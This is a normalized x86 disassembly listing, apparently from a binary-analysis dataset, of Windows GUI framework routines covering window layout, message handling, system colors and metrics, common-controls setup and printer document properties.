pop esi
retn 0x8
and ah 0xfd
sub_415518
push esi
mov esi ecx
push sub_416fa2
mov ecx rw-data
call sub_4178f4
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_415545
mov eax sub_4181a0
call sub_4072e4
sub esp 0x3c
push esi
push edi
push 0x0
call sub_413ee4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_4127ef
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_415518
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_4127ef
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_4127ef
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_413bf6
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_415518
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_4145c9
mov eax esi
jmp r-xdata
sub_4155e9
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415644
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_415644
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_413777
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_414ce5
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_414ce5
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_413777
jmp r-xdata
sub_41572c
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_415545
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_413ebd
sub_41577b
push esi
mov esi ecx
call sub_41730f
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_41730f
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_416175
test eax 0x40000000
jne r-xdata
call sub_413553
test eax eax
je r-xdata
mov ecx rw-data
call sub_416298
mov ecx esi
call sub_413ebd
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_415470
call sub_413553
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_417007
mov ecx rw-data
call sub_417989
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_4157f8
push esi
push edi
mov edi ecx
call sub_41730f
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_4158fa
pop edi
pop esi
retn 0x8
push sub_417007
mov ecx rw-data
call sub_417989
mov esi eax
call sub_413553
test eax eax
je r-xdata
call sub_413553
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_41584b
push esi
mov esi ecx
call sub_41730f
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_416175
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_413e88
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_415470
push [ esp + 0x8 ]
mov ecx eax
call sub_416334
sub_415896
push ebx
push esi
push edi
mov ebx ecx
call sub_416175
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_413ebd
call sub_405e84
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_4158fa
push esi
mov esi ecx
call sub_405e84
cmp eax esi
jne r-xdata
mov ecx esi
call sub_416175
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_4162dc
mov ecx esi
call sub_413ebd
pop esi
retn 0x8
call sub_413e88
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_415470
sub_415943
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_415545
test eax eax
je r-xdata
mov ecx esi
call sub_413ebd
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_41596d
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_413ebd
push 0x0
call sub_415518
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_41598e
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_413ebd
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_4159d8
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_415518
test eax eax
je r-xdata
mov ecx esi
call sub_413ebd
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4159ff
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_4164c6
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_415a74
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_416175
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_406060
push eax
call sub_4060cb
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_405e84
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_406060
push eax
call sub_4060cb
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_4161a9
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_415c30
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_415c54
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_41730f
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_414a92
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_415c95
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_415d0c
push ebp
mov ebp esp
sub esp 0x34
call sub_41730f
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_406580
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_41730f
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_414a92
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_414a92
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_414a92
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_415c54
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_415c54
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_415c95
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_415c95
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_415c95
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_415c95
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_415c95
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_415c95
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_415c95
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_415c95
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_415c95
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_415c95
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_415c95
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_415c95
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_415c95
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_415fd5
mov eax sub_41821e
call sub_4072e4
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_41267b
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_41267b
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_4126be
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_41603a
mov eax sub_418228
call sub_4072e4
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_4127ef
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_4127ef
test eax eax
je r-xdata
push sub_41662c
call sub_413462
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_413568
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_412822
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_413462
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_4125cf
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_4160f9
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_412703
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_4128b4
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_4161a9
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_41625b
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_4127ef
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_416298
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_4162dc
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_417aeb
call sub_417abb
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_416334
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_4165f6
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_4165f6
mov [ esi + 0x94 ] edi
sub_4163e1
mov eax sub_41829a
call sub_4072e4
push esi
call sub_417335
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_41662c
call sub_413462
push 0x48
mov ebx eax
call sub_413474
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_415fd5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_413462
pop ebx
sub_416486
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4163e1
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_412872
sub_4164c6
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_416510
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_416585
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_4165f6
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_41662c
push esi
call sub_4170dd
mov esi eax
test esi esi
je r-xdata
call sub_4125cf
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_40855c
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_4085a1
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_406c50
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_4166ae
mov eax sub_4182d6
call sub_4072e4
push esi
call sub_417335
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_41662c
call sub_413462
push 0x48
mov ebx eax
call sub_413474
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_415fd5
